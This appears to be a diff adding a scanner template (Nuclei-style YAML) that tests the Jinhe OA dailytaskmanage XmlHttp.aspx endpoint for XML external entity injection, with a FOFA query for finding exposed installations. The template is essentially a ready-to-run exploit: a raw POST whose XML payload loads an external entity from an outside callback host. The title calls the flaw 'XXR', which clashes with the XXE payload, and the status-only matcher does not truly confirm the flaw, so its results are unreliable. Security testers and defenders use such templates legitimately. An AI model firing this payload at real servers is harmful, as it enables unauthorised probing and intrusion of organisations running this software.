@@ -1,0 +1,34 @@
+id: poc-aetcistfuezv84xx
+info:
+  name: 金和OA dailytaskmanage XmlHttp.aspx 存在XXR注入漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/aetcistfuezv84xx'
+  tags: other,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: aetcistfuezv84xx
+    fofa: app="金和网络-金和OA"
+http:
+- raw:
+  - 'POST /c6/Jhsoft.Web.dailytaskmanage/XmlHttp.aspx/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/xml
+
+
+    <?xml version="1.0" encoding="UTF-8"?>
+
+    <!DOCTYPE root [
+
+    <!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
+
+    %remote;]>
+
+    <root/>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
